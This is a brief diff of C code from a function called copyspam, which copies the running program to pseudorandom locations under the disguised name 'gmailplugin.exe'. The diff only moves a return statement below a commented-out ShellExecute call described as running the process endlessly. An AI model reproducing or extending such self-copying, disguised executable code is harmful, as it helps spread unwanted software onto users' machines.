@@ -20,8 +20,8 @@ int copyspam(char s[50]){// makes a copy of the programm in 'pseudorandom' locat
 	strcat(fullname,"gmailplugin.exe");
     char * new_file = fullname;
     ( void ) CopyFile ( ( LPCTSTR )original_file, ( LPCTSTR )new_file, FALSE);
-    return 0;
-//   ShellExecute(GetDesktopWindow(),"open",fullname,NULL,NULL,SW_SHOW); // RUNS PROCESS ENDESLY 
+//   ShellExecute(GetDesktopWindow(),"open",fullname,NULL,NULL,SW_SHOW); // RUNS PROCESS ENDESLY   
+	return 0;
 	}
 }
 
